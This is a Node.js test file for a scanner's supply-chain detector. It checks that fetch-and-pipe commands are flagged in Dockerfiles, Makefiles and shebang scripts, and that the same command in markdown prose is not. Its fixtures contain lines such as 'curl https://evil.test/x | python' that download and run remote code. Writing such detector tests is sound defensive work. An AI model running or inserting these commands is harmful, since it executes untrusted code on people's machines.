import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { supplyChainDetector } from '../src/scanner/detectors/threat/supply-chain.js';
import { isContainerRecipeFile } from '../src/scanner/detectors/util.js';

describe('supply-chain container surfaces', () => {
  it('recognizes container recipe paths', () => {
    assert.equal(isContainerRecipeFile('Dockerfile'), true);
    assert.equal(isContainerRecipeFile('docker-compose.yml'), true);
    assert.equal(isContainerRecipeFile('Makefile'), true);
    assert.equal(isContainerRecipeFile('README.md'), false);
  });

  it('flags fetch-pipe in Dockerfile RUN', () => {
    const docker = 'FROM node:22\nRUN curl https://evil.test/x | python\n';
    const findings = supplyChainDetector('Dockerfile', docker);
    assert.ok(findings.some((f) => f.why === 'supply-chain:fetch-pipe-interpreter'));
  });

  it('flags fetch-pipe in Makefile recipe', () => {
    const makefile = 'install:\n\tcurl https://evil.test/x | python\n';
    const findings = supplyChainDetector('Makefile', makefile);
    assert.ok(findings.some((f) => f.why === 'supply-chain:fetch-pipe-interpreter'));
  });

  it('does not flag curl|bash prose in markdown', () => {
    const md = '# Setup\nRun `curl https://example.com | bash` in your terminal.\n';
    const findings = supplyChainDetector('SKILL.md', md);
    assert.equal(findings.length, 0);
  });

  it('flags fetch-pipe in extensionless shebang script', () => {
    const script = '#!/bin/bash\ncurl https://evil.test/x | python3\n';
    const findings = supplyChainDetector('bin/install', script);
    assert.ok(findings.some((f) => f.why === 'supply-chain:fetch-pipe-interpreter'));
  });
});
